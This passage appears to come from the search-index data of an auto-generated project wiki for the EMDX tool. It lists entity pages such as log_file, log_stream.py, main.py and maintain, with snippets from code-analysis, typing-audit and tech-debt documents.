<p>..._cli_errors` decorator defined but NEVER imported or used anywhere in codebase</p> </li> <li>Location: <code>emdx/utils/cli.py:13-39</code></li> <li> <p>Recommendation: DELETE entire file (40 lines)</p> </li> <li> <p>#4759 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Common Themes Across All Analyses</p> <p>...Solution*: Dynamic calculation of available space within 30-character column</p> </li> <li>Location: <code>activity_view.py:700-708</code></li> <li> <p>Consensus: High-priority fix ensuring UI elements remain visible</p> </li> <li> <p>#4834 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: 1. SQLiteDatabase Wrapper Architecture Bug (Identified by all 4 tracks)</p> <p>Location: <code>emdx/database/__init__.py:48-85</code></p> </li> <li> <p>#445 Piped content - 2025-07-12 01:58   Section: Historical Analysis</p> <p>...tation</p> </li> <li>Source: FZF browser interface (removed in commit bbf8291)</li> <li>Display Location: FZF header </li> <li>Command Text: \"j/k:nav e:edit d:delete v:view /:search q:quit\"</li> <li>Context: Help text was part of FZF's <code>--header</code> option</li> </ul>"},{"location":"entities/location/#location_1","title":"Location","text":""},{"location":"entities/location/#location_2","title":"Location","text":"<p>/Users/alexrockwell/mcp-servers/gmail-mcp/</p>"},{"location":"entities/location/#critical-executiondoc_id-never-updated-after-delegate-completes","title":"CRITICAL: execution.doc_id never updated after delegate completes","text":""},{"location":"entities/location/#related-entities","title":"Related Entities","text":"<ul> <li><code>tests/test_lazy_loading.py:10</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>for plans</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>for issues/bugs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>for implementations</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>reproduction</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>contradictions resolved</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>how to test</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>what was built</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>problem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>implementation gameplan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> </ul>"},{"location":"entities/logfile/","title":"log_file","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-13</p>"},{"location":"entities/logfile/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...ted_at<code>| TIMESTAMP (nullable) | When execution finished (NULL while running) | |</code>log_file<code>| TEXT NOT NULL | Path to the delegate's log file | |</code>exit_code<code>| INTEGER (nullable) | Process exit code (NULL while running) | |</code>working_dir` | TEXT (nullable)...</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...file</p> </li> <li> <p>13 fields matching <code>ExecutionResult.to_dict()</code>: <code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, <code>exit_code</code>, <code>cli_tool</code></p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...(before Document Merger types)</p> </li> <li> <p>Fields: <code>success</code> (bool), <code>execution_id</code> (int), <code>log_file</code> (str), <code>output_doc_id</code> (int | None), <code>output_content</code> (str | None), <code>tokens_used</code> (int), <code>input_tokens</code> (int), <code>output_tokens</code> (int), <code>cost_usd</code> (float), `execution...</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: 1. <code>unified_executor.py:192</code> \u2014 <code>ExecutionResult.to_dict()</code></p> <p>...wn** \u2014 it serializes a dataclass with 12 fixed fields (<code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, <code>exit_code</code>, <code>cli_tool</code>). Howe...</p> </li> <li> <p>#6566 Delegate: Review the UnifiedExecutor in emdx/services/unified_executor [2/3]   Section: Real-Time Log Streaming</p> <p>formatted = format_stream_line(line, time.time())     if formatted:         log_file.write(formatted + \"\\n\")         log_file.flush()  # Immediate flush for live viewing ```</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <ul> <li><code>AgentExecutionDict</code>: Agent execution data used by <code>AgentExecutionItem</code> in the activity view. Fields include <code>id</code>, <code>doc_id</code>, <code>doc_title</code>, <code>status</code>, <code>started_at</code>, <code>completed_at</code>, <code>log_file</code>, <code>exit_code</code>, <code>working_dir</code>, <code>cost_usd</code>, <code>tokens_used</code>.</li> </ul> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: delegate.py - Execution Creation Flow</p> <p>...gate!        doc_title=config.title,       # e.g., \"Delegate: analyze auth\"        log_file=str(log_file),        working_dir=config.working_dir,    )    ```</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>...When execution began | | <code>completed_at</code> | TIMESTAMP | When execution finished | | <code>log_file</code> | TEXT | Path to log file | | <code>exit_code</code> | INTEGER | Process exit code | | <code>working_dir</code> | TEXT | Working directory | | <code>pid</code> | INTEGER | Process ID for zombie det...</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> </li> <li><code>log_file</code> \u2014 path to execution log</li> <li><code>working_dir</code>, <code>pid</code> \u2014 runtime info</li> <li><code>last_heartbeat</code> \u2014 liveness tracking</li> </ul>"},{"location":"entities/logfile/#execution-specific-fields-not-in-tasks","title":"Execution-Specific Fields (not in tasks):","text":""},{"location":"entities/logfile/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.3)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>exit_code</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=6.1)</li> <li><code>cli_tool</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.0)</li> <li><code>mapping[str, any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>`emdx/services/unified_executor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/logstreampy/","title":"log_stream.py","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-01-05</p>"},{"location":"entities/logstreampy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6434 Any/None typing audit [4/5]   Section: auto_tagger.py </li> <li><code>group_service.py</code> \u2705</li> <li><code>tag_service.py</code> \u2705</li> <li><code>document_service.py</code> \u2705</li> <li><code>execution_service.py</code> \u2705</li> <li><code>log_stream.py</code> \u2705</li> <li><code>similarity.py</code> \u2705</li> <li><code>cli_executor/__init__.py</code> \u2705</li> <li> <p><code>cli_executor/factory.py</code> \u2705</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>Other services use function-based modules:</p> </li> <li> <p><code>auto_tagger.py</code>, <code>file_watcher.py</code>, <code>log_stream.py</code></p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: 1. Service Boundaries Analysis</p> <p>...py)</p> </li> <li>file_watcher.py: Single responsibility, cross-platform file watching</li> <li> <p>log_stream.py: Clean subscriber pattern for log file streaming</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...sor</p> </li> <li><code>cascade_service.py</code>: pipeline facade for UI, monitoring completion</li> <li><code>log_stream.py</code>: event-driven log streaming via file watcher</li> <li><code>auto_tagger.py</code>: automatic tag assignment</li> <li><code>health_monitor.py</code>: system health checks</li> <li> <p>*<code>cli_executor/</code>...</p> </li> <li> <p>#6311 Delegate: Analyze DEAD CODE &amp; DUPLICATION across emdx/ (exclude ui/ an [8/15]   Section: Candidates to verify</p> <p>...? | Notes | |--------|-------|-------| | <code>services/file_watcher.py</code> | \u2713 | Used by <code>log_stream.py</code> | | <code>services/ask_service.py</code> | \u2713 | Used by <code>commands/ask.py</code> | | <code>services/execution_monitor.py</code> | ? | Needs verification | | <code>services/auto_tagger.py</code> | ? | Needs...</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udfe0 High Priority Issues</p> <p>Example violations:</p> </li> <li><code>unified_executor.py:465</code> - bare <code>except Exception</code></li> <li><code>log_stream.py</code> - multiple bare exception handlers</li> <li> <p><code>similarity.py:536</code> - catching generic Exception</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...[00:02:47] \ud83d\udcbb Using tool: Bash [00:02:47] \ud83d\udcc4 Tool result: diff --git a/emdx/services/log_stream.py b/emdx/services/log_stream.py index e67b0f4..413bc98 100644... [00:02:47] \ud83d\udcc4 Tool result: 0b2fc3a Merge remote-tracking branch 'origin/main' into fix/workflow-fk-cons...</p> </li> <li> <p>#1835 Architecture Analysis: EMDX Control Center v5 Implementation   Section: Current Architecture Strengths</p> </li> <li><code>auto_tagger.py</code> - Tag suggestion engine</li> <li><code>execution_monitor.py</code> - Process monitoring</li> <li><code>log_stream.py</code> - Event-driven streaming (not polling!)</li> <li> <p><code>lifecycle_tracker.py</code> - Document lifecycle</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...ument_merger.py**: All 5 necessary</p> </li> <li>embedding_service.py: All 1 necessary</li> <li>log_stream.py: All 1 necessary</li> <li>health_monitor.py: All 2 necessary</li> <li>duplicate_detector.py: All 2 necessary</li> <li>cascade_service.py: All 2 necessary</li> <li> <p>**file_watcher.p...</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: ACTUALLY UNNECESSARY <code>| None</code> Annotations</p> </li> </ul> <pre><code>self.watcher: FileWatcher | None = None\n</code></pre> <p>Verdict: NECESSARY \u2014 Starts as <code>None</code> until watching starts.</p> <ul> <li>#6445 Test [2/2]   Section: Coverage Analysis by Area <p>...ry point | | <code>ui/cascade/cascade_browser.py</code> | 30% | Cascade browser | | <code>services/log_stream.py</code> | 33% | Log streaming | | <code>utils/structured_logger.py</code> | 37% | Structured logging | | <code>ui/cascade/stage_summary_bar.py</code> | 38% | Cascade stage bar | | `ui/cascade/ne...</p> </li> </ul>"},{"location":"entities/logstreampy/#files-with-no-any-usage","title":"Files with NO <code>Any</code> usage","text":""},{"location":"entities/logstreampy/#5-services-layer","title":"5. Services Layer","text":""},{"location":"entities/logstreampy/#3-log_streampy36-watcher","title":"3. <code>log_stream.py:36</code> \u2014 <code>watcher</code>","text":""},{"location":"entities/logstreampy/#related-entities","title":"Related Entities","text":"<ul> <li><code>file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>ui/presenters/document_browser_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>metrics summary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>auto_tagger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.4)</li> <li><code>health_monitor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.3)</li> <li><code>tag_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>services/file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>unified_search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/long-term/","title":"long-term","text":"<p>Type: heading | Mentioned in: 8 documents | First seen: 2025-07-12</p>"},{"location":"entities/long-term/#documents-8","title":"Documents (8)","text":"<ul> <li>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: 6. Recommended Architecture Improvements </li> <li>Define service protocols (abstract interfaces) for major service categories</li> <li> <p>Dependency injection for database connections (currently mixed patterns) 3....</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: Recommendations</p> </li> <li>Target 50% overall code coverage</li> <li>Achieve mypy strict mode compliance</li> <li> <p>Consider property-based testing for core data operations</p> </li> <li> <p>#6231 Delegate: Audit CONFIGURATION DEBT in the emdx project: Find hardcoded [2/14]   Section: RECOMMENDATIONS</p> </li> <li>Consider YAML config file for user-adjustable settings</li> <li>Add <code>emdx config</code> command for runtime configuration</li> <li> <p>Support reading defaults from <code>~/.config/emdx/defaults.yaml</code></p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: Recommendations</p> </li> <li>Consider adding a <code>--allow-shell</code> flag for <code>--each</code> that must be explicitly enabled</li> <li> <p>Add security audit to CI pipeline</p> </li> <li> <p>#6183 Delegate: analysis,audit [13/17]   Section: Recommendations</p> </li> <li>Continue dependency cleanup (ongoing - excellent progress)</li> <li> <p>Monitor UI layer growth (31% of codebase)</p> </li> <li> <p>#451 Tag Taxonomy for EMDX Project Management   Section: Context Tags</p> </li> <li><code>urgent</code> - Time-sensitive</li> <li><code>deadline-&lt;date&gt;</code> - Specific deadline</li> <li> <p><code>long-term</code> - Extended timeline</p> </li> <li> <p>#4834 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Critical Findings (Prioritized)</p> <p>Recommendation: Consider one of these long-term solutions:</p> </li> <li>Make module functions accept an optional connection parameter</li> <li>Fully encapsulate the connection in the wrapper class</li> <li> <p>Document the global singleton pattern clearly</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Recommended Priority Actions</p> <p>...Medium-term: Add logging to bare except blocks, create utility functions</p> </li> <li>Long-term: Address type safety, remove debug code [23:49:37] \u2705 Task completed successfully! RAW_RESULT_JSON:{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,\"durati...</li> </ul>"},{"location":"entities/long-term/#long-term_1","title":"Long-term","text":""},{"location":"entities/long-term/#long-term_2","title":"Long-term","text":""},{"location":"entities/long-term/#long-term_3","title":"Long-term","text":""},{"location":"entities/long-term/#long-term_4","title":"Long-term","text":""},{"location":"entities/long-term/#long-term_5","title":"Long-term","text":""},{"location":"entities/long-term/#time-sensitivity","title":"Time Sensitivity","text":""},{"location":"entities/long-term/#related-entities","title":"Related Entities","text":"<ul> <li><code>source files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>largest files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>short-term</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.5)</li> <li><code>medium-term</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>low severity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>immediate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>test files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>medium severity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>immediate actions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>high severity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/mainpy/","title":"main.py","text":"<p>Type: tech_term | Mentioned in: 15 documents | First seen: 2026-01-13</p>"},{"location":"entities/mainpy/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>...elete<code>commands. None of these exist. The</code>group<code>subcommand is not registered in</code>main.py<code>. The</code>commands/groups.py<code>file doesn't exist,</code>database/groups.py<code>doesn't exist, and</code>services/group_service.py` doesn't exist.</p> </li> <li> <p>#6828 Delegate: --help [2/2]</p> <ol> <li><code>emdx --help</code> still shows the concise delegate description from <code>LAZY_HELP</code> in <code>main.py</code>.</li> </ol> </li> <li> <p>#6827 Delegate: --help [2/2]   Section: Summary</p> <ol> <li>Removed redundant <code>help=</code> from Typer constructor (line 53) \u2014 The short description \"One-shot AI execution (parallel, worktree, PR)\" is already provided by <code>LAZY_HELP</code> in <code>main.py</code>, so the <code>help=</code> parameter on the Typer app was unnecessary.</li> </ol> </li> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]   Section: Actionable Next Steps</p> <ol> <li>Start with <code>emdx next</code> \u2014 Create <code>emdx/commands/next.py</code>, implement priority logic, register in <code>main.py</code></li> </ol> </li> <li> <p>#6545 Delegate Enhancement Gameplans [1/5]   Section: Implementation Checklist</p> <p>...ate <code>emdx/commands/next.py</code> with decision logic</p> </li> <li>[ ] Import and register in <code>emdx/main.py</code></li> <li>[ ] Write tests in <code>tests/test_next.py</code></li> <li>[ ] Run <code>poetry run ruff check . --fix</code> for lint</li> <li>[ ] Run <code>poetry run pytest tests/test_next.py -x</code> for tests</li> <li> <p>[ ] Man...</p> </li> <li> <p>#6544 Delegate Enhancement Gameplans [4/5]   Section: File Structure</p> <p>Register in <code>main.py</code>:</p> </li> </ul> <pre><code>from .commands.wrapup import app as wrapup_app\napp.add_typer(wrapup_app, name=\"wrapup\")\n</code></pre> <ul> <li>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Components </li> <li>Registered as lazy command in <code>main.py</code></li> <li>Discovery mode: Free TF-IDF clustering  </li> <li>Synthesis mode: Claude API merging</li> <li> <p>Archives originals with <code>superseded</code> tags</p> </li> <li> <p>#6448 Implement emdx compact command   Section: Components Created</p> <p>...# 2. Compact Command (<code>emdx/commands/compact.py</code>)</p> </li> <li>Registered as lazy command in <code>main.py</code></li> <li>Discovery mode (<code>--dry-run</code>): Free, local TF-IDF clustering</li> <li>Synthesis mode: Claude Opus API for intelligent merging</li> <li>Key options:</li> <li> <p><code>--dry-run</code> / <code>-n</code>: Show...</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Key Files</p> <p>...thod | | <code>emdx/config/constants.py</code> | EXTEND | Add <code>COMPACT_*</code> constants | | <code>emdx/main.py</code> | EXTEND | Register command | | <code>tests/test_compact.py</code> | NEW | Test suite |</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Implementation Tasks</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Strengths</p> </li> <li><code>main.py</code> uses lazy loading for heavy commands (cascade, delegate, ai)</li> <li>Eager loading only for fast core commands</li> <li> <p>Safe mode for disabling execution commands</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 4. Not Recommended</p> <p>Some patterns that might seem improvable but work well:</p> </li> <li>The lazy loading in <code>main.py</code> - clever and effective</li> <li>Global <code>db_connection</code> for simple cases - works fine for CLI</li> <li> <p>The facade in <code>cascade_service.py</code> - reasonable for UI isolation</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> </li> <li>Lazy loading for heavy commands (cascade, delegate, ai) to minimize startup time</li> <li>Safe mode (<code>EMDX_SAFE_MODE=1</code>) disables execution commands</li> <li> <p>**Tag sho...</p> </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Changes Made</p> </li> <li><code>ENV_VARS</code> dict documenting all known env vars</li> <li><code>BOOL_TRUTHY_VALUES</code> for consistent boolean parsing</li> <li> <p>Updated <code>main.py</code> to use <code>BOOL_TRUTHY_VALUES</code></p> </li> <li> <p>#4754 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Common Themes Across All Analyses</p> <p>...independently identified the same layered architecture:</p> </li> <li>Entry Points: CLI (<code>main.py</code>) + TUI (<code>gui.py</code>)</li> <li>Layer Flow: CLI \u2192 Commands (18-21 modules) \u2192 Models/Services \u2192 Database</li> <li>Design Patterns: Registry (agents/workflows), MVVM (UI), Event...</li> </ul>"},{"location":"entities/mainpy/#compact-command-emdxcommandscompactpy","title":"Compact Command (<code>emdx/commands/compact.py</code>)","text":""},{"location":"entities/mainpy/#5-register-command-in-mainpy","title":"5. Register Command in main.py","text":"<p>Add to <code>LAZY_SUBCOMMANDS</code>: ```python LAZY_SUBCOMMANDS = {     # ...existing...     \"distill\": \"emdx.commands.distill:app\", }</p>"},{"location":"entities/mainpy/#1-clean-entry-point-pattern","title":"1. Clean Entry Point Pattern","text":""},{"location":"entities/mainpy/#1-entry-point-mainpy","title":"1. Entry Point (<code>main.py</code>)","text":""},{"location":"entities/mainpy/#5-added-environment-variable-documentation","title":"5. Added Environment Variable Documentation","text":""},{"location":"entities/mainpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>register command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>synthesis prompt template</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>split large files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>session-summary,active</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>output design:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>progress tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>lazy_help</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>emdx --help</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>tests/test_compact.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/maintain/","title":"maintain","text":"<p>Type: heading | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/maintain/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6653 Delegate: README Rewrite - Minimal Prose / Max Examples [6/10]   Section: Maintain</p> <p>```bash $ emdx maintain compact --dry-run      # Find similar docs to merge $ emdx maintain compact --auto         # Merge discovered clusters $ emdx maintain index                  # Build...</p> </li> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>15. MISSING: <code>emdx maintain</code> subcommands not documented Several <code>maintain</code> subcommands exist but aren't in the docs:</p> </li> <li> <p><code>emdx maintain cleanup-dirs</code> \u2014 clean up temporary execution directories...</p> </li> <li> <p>#6714 Wiki Generation Architecture Research [10/10]   Section: Research Summary</p> <p>Analyzed 15+ command modules, the full <code>maintain.py</code> (1481 LOC), <code>core.py</code> save flow, distill/explore/briefing output patterns, synthesis service, entity/wikify services, recipe system, and existing <code>export_profiles</code> schema.</p> </li> <li> <p>#6368 Gameplans: compact, distill, and draft-pr [synthesis]   Section: Implementation Priority</p> </li> <li><code>emdx distill &lt;id&gt;</code> \u2014 Single-doc summarization</li> <li><code>emdx compact --schedule weekly</code> \u2014 Automated compaction</li> <li> <p>Integration with <code>maintain</code> command</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Overview</p> <p>...y through AI-powered document synthesis. Unlike mechanical concatenation (current <code>maintain --merge</code>), this command uses Claude Opus to intelligently synthesize related documents into unified, coherent 